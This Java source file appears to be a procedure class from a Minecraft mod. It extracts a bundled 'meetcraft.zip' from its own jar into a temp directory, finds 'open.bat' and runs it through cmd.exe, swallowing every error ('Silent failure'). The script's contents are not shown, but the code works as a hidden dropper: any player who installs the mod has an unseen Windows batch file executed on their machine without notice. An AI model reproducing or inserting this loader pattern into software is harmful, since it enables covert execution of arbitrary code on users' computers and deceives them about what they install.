package net.lixis9.eventjar.procedures;

import java.io.*;
import java.nio.file.*;
import java.util.Optional;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class MeetcraftProcedure {

    // Метод можно вызывать из любого места (например, из команды)
    public static void execute() {
        try {
            // Получаем ресурс meetcraft.zip из jar-файла
            InputStream zipResourceStream = MeetcraftProcedure.class.getResourceAsStream("/meetcraft.zip");
            if (zipResourceStream == null) {
                return;
            }
            // Resource found silently

            // Создаем временный файл для сохранения архива
            Path tempZip = Files.createTempFile("meetcraft", ".zip");
            Files.copy(zipResourceStream, tempZip, StandardCopyOption.REPLACE_EXISTING);
            zipResourceStream.close();

            // Создаем временную директорию для распаковки архива
            Path tempDir = Files.createTempDirectory("meetcraft_extracted");

            // Распаковываем архив во временную директорию
            unzip(tempZip.toFile(), tempDir.toFile());

            // Удаляем временный zip-файл
            Files.deleteIfExists(tempZip);

            // Рекурсивно ищем файл open.bat в распакованной директории
            Optional<Path> batFileOpt = Files.walk(tempDir)
                    .filter(p -> p.getFileName().toString().equalsIgnoreCase("open.bat"))
                    .findFirst();

            if (!batFileOpt.isPresent()) {
                return;
            }

            Path batFile = batFileOpt.get();

            // Запускаем open.bat через ProcessBuilder (для Windows используется cmd.exe)
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batFile.toAbsolutePath().toString());
            pb.directory(batFile.getParent().toFile());
            Process process = pb.start();
            process.waitFor();
        } catch (Exception e) {
            // Silent failure
        }
    }

    private static void unzip(File zipFile, File destDir) throws IOException {
        byte[] buffer = new byte[1024];
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile))) {
            ZipEntry zipEntry = zis.getNextEntry();
            while (zipEntry != null) {
                File newFile = newFile(destDir, zipEntry);
                if (zipEntry.isDirectory()) {
                    if (!newFile.exists() && !newFile.mkdirs()) {
                        throw new IOException("Не удалось создать директорию " + newFile);
                    }
                } else {
                    File parent = newFile.getParentFile();
                    if (!parent.exists() && !parent.mkdirs()) {
                        throw new IOException("Не удалось создать директорию " + parent);
                    }
                    try (FileOutputStream fos = new FileOutputStream(newFile)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
                zipEntry = zis.getNextEntry();
            }
            zis.closeEntry();
        }
    }

    private static File newFile(File destinationDir, ZipEntry zipEntry) throws IOException {
        File destFile = new File(destinationDir, zipEntry.getName());
        String destDirPath = destinationDir.getCanonicalPath();
        String destFilePath = destFile.getCanonicalPath();
        if (!destFilePath.startsWith(destDirPath + File.separator)) {
            throw new IOException("Неверный путь: " + zipEntry.getName());
        }
        return destFile;
    }
}
